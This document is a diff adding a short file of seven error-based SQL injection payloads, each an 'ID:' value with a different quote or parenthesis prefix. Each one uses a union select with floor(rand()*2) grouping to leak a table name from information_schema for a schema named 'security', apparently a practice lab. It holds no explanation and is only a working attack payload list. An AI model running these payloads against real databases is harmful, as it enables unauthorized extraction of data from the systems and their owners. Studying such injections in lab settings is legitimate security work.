@@ -1,0 +1,7 @@
+ID:0" union select count(*),count(*),concat((select table_name from information_schema.tables where table_schema="security" limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:0" union select count(*),count(*),concat((select table_name from information_schema.tables where table_schema="security" limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:0") union select count(*),count(*),concat((select table_name from information_schema.tables where table_schema="security" limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:01 union select count(*),count(*),concat((select table_name from information_schema.tables where table_schema="security" limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1 union select count(*),count(*),concat((select table_name from information_schema.tables where table_schema="security" limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1 union select count(*),count(*),concat((select table_name from information_schema.tables where table_schema="security" limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1" union select count(*),count(*),concat((select table_name from information_schema.tables where table_schema="security" limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#
